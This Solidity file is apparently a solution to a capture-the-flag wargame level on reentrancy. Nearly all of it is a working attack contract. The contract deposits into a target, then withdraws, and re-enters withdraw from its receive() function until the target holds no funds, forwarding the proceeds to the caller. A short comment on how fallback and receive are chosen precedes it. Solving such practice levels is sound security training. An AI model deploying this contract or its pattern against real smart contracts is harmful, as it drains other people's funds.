// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

/**
 * Explainer from: https://solidity-by-example.org/fallback
 * ETH is sent to contract
 *      is msg.data empty?
 *           /    \
 *         yes    no
 *         /       \
 *    receive()?  fallback()
 *      /     \
 *    yes     no
 *    /        \
 * receive()  fallback()
 */

// ================================================================
// │                       LEVEL 10 - REENTRANCY                  │
// ================================================================
contract Reentrancy {
    IReentrance targetContract;
    uint256 attackValue;

    constructor(address _targetContractAddress) payable {
        targetContract = IReentrance(_targetContractAddress);
        attackValue = address(targetContract).balance;
        if (attackValue == 0) revert("Target contract has no funds to exploit");
        if (attackValue > address(this).balance) revert("Target contract has more funds than the exploit contract");
    }

    function attack() public {
        // Attack contract
        targetContract.donate{value: attackValue}(address(this));
        targetContract.withdraw(attackValue);

        (bool refundSuccess,) = address(msg.sender).call{value: address(this).balance}("");
        if (!refundSuccess) revert("Refund call failed");
    }

    receive() external payable {
        uint256 targetBalance = address(targetContract).balance;
        if (targetBalance >= attackValue) {
            targetContract.withdraw(attackValue);
        }
    }
}
